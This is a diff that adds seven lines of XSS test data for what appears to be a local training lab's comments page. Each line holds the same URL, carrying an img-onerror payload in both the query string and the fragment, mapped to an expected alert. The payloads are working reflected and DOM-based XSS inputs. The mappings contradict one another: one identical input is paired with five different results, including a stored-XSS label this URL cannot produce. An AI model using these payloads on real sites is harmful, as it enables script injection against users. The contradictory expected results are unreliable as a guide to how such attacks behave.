@@ -1,0 +1,7 @@
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("XSS")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("XSS")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("XSS-DOM")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("1")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("1")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("XSS-reflejado")
+https://localhost:8443/lab/vuln/comentarios?q=%3Cimg%20src=x%20onerror=alert(%22XSS-reflejado%22)%3E#%3Cimg%20src=x%20onerror=alert(%22XSS-DOM%22)%3E -> alert("XSS-almacenado")
